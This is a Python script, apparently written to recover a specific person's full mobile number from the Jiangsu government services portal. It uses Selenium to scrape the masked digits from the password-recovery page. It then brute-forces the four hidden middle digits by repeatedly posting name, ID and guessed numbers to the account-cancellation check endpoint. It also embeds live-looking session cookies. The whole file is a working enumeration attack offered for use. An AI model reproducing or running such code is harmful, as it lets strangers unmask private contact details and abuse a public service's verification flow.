import requests
from selenium import webdriver
import time
import re


class getNum:
    # get basic info
    def __init__(self):
        self.name = input('请输入姓名：')
        self.id = input('请输入电话号码：')
        self.cookie1 = {
            'pageUrl': 'http%3A%2F%2Fwww.jszwfw.gov.cn%2Fjsjis%2Ffront%2FaccountCancel%2FscanFace.do',
            '_pubk': 'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCb71WiUMr2WMwCvCJC%2FM868kojjC5nTlW2VAXw%0AWOaiPQh9F9pbs8MgoqUMeXEJb7H9LWh%2FYqtv8eTpRQq6TCMyaU8u%2Fvj5rZsqFR7wEOEL%2BzDdt7Xr%0A%2Fn7aoOwRDMYRPdnxV5PwyDLYrVGX4%2Fx4%2BSxcpbflgchjPHx10ubEd7KM2QIDAQAB%0A',
            'pageUrl': 'http%3A%2F%2Fwww.jszwfw.gov.cn%2Fjsjis%2Ffront%2Flogin.do',
            'JSESSIONID': '03F54A354BF8249C652AF30D7806D347',
            '_jubacdata': '715bfa6ab5ae268b354dc235bf5fd7160e155d2f6dc0aa3ae04c2954aa41a0840cfe599352c788436dfdf8f311cc1636f33d6f9130a23443cc308f7b9a8ef2df32c79d6e4e6a81d974e6cd60b1bd0ab024550b6db391e001a642b7616b1f4577ac983fa5f218ec6a991c815e0488ba6ff640c9c4517060f4',
            'acw_tc': '755bb32316118136109038425e67edf974929dfdd8c42790e4936f6f77',
            'SERVERID': 'bc38d539bdb4e9df6fbd88e7a47405f3|1611814763|1611813610'
        }
        self.cookie2 = {
            'pageUrl':'http%3A%2F%2Fwww.jszwfw.gov.cn%2Fjsjis%2Ffront%2FaccountCancel%2FscanFace.do',
            ' _pubk':'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCb71WiUMr2WMwCvCJC%2FM868kojjC5nTlW2VAXw%0AWOaiPQh9F9pbs8MgoqUMeXEJb7H9LWh%2FYqtv8eTpRQq6TCMyaU8u%2Fvj5rZsqFR7wEOEL%2BzDdt7Xr%0A%2Fn7aoOwRDMYRPdnxV5PwyDLYrVGX4%2Fx4%2BSxcpbflgchjPHx10ubEd7KM2QIDAQAB%0A',
            ' pageUrl':'http%3A%2F%2Fwww.jszwfw.gov.cn%2Fjsjis%2Ffront%2Flogin.do',
            ' JSESSIONID':'03F54A354BF8249C652AF30D7806D347',
            ' _jubacdata':'715bfa6ab5ae268b354dc235bf5fd7160e155d2f6dc0aa3ae04c2954aa41a0840cfe599352c788436dfdf8f311cc1636f33d6f9130a23443cc308f7b9a8ef2df32c79d6e4e6a81d974e6cd60b1bd0ab024550b6db391e001a642b7616b1f4577ac983fa5f218ec6a991c815e0488ba6ff640c9c4517060f4',
            ' acw_tc':'755bb32316118136109038425e67edf974929dfdd8c42790e4936f6f77',
            ' SERVERID':'bc38d539bdb4e9df6fbd88e7a47405f3|1611814769|1611813610'
}
        self.session = requests.session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/87.0.4280.141 Safari/537.36'}


    # fetch every part of the target number
    #     use selenium to fetch or use requests
    def fetch(self):
        driver_fetch_parts = webdriver.Chrome()
        driver_fetch_parts.get(url='http://www.jszwfw.gov.cn/jsjis/front/findpwd/step1.do')

        veri_result1 = input('请输入修改密码页面的验证码：')

        driver_fetch_parts.find_element_by_id('accountnum').send_keys(id)
        driver_fetch_parts.find_element_by_xpath('//*[@id="randCode"]').send_keys(veri_result1)
        driver_fetch_parts.find_element_by_xpath('//*[@id="findpwdform"]/div/div[3]/input').click()
        time.sleep(1)
        driver_fetch_parts.find_element_by_xpath('//*[@id="mobileFind"]/button').click()
        raw_text = str(driver_fetch_parts.find_element_by_xpath('//*[@id="span_type1"]').text)
        driver_fetch_parts.close()
        var = raw_text.lstrip()
        first_three = var[5:8]
        last_four = var[12:16]
        print('前三位是' + first_three, '后四位是' + last_four)
        return first_three, last_four

    # start loop, single threads version
    def loop(self, first_three, last_four):
        for i in range(9469, 10000):
            # temp = middle_four
            if i < 10:
                middle_four = '000' + str(i)
            elif 10 <= i < 100:
                middle_four = '00' + str(i)
            elif 100 <= i < 1000:
                middle_four = '0' + str(i)
            else:
                middle_four = str(i)

            # temp = (int(middle_four) - 1)
            #
            # if temp < 10:
            #     temp = '000' + str(temp)
            # elif 10 <= temp < 100:
            #     temp = '00' + str(temp)
            # elif 100 <= temp < 1000:
            #     temp = '0' + str(temp)
            # else:
            #     temp = str(temp)

            full_num = first_three + middle_four + last_four

            form_data = {
                'name': self.name,
                'papersNumber': self.id,
                'mobile': full_num
            }

            res = self.session.post(url='http://www.jszwfw.gov.cn/jsjis/front/accountCancel/checkInfo.do', cookies=self.cookie2,
                               data=form_data)
            print(full_num, 'has been tested...')

            if bool(re.search('true', res.text)):
                print('该用户的电话号码是：', full_num)
                print('---------------------------all done!!! ---------------------------')
                break


if __name__ == '__main__':
    # init all the parameters
    get_num = getNum()
    # get num parts
    # first_three, last_four = get_num.fetch()
    first_three = '152'
    last_four = '8729'
    s = time.time()
    get_num.loop(first_three, last_four)
    e = time.time()
    print('总耗时：', e - s, 's')

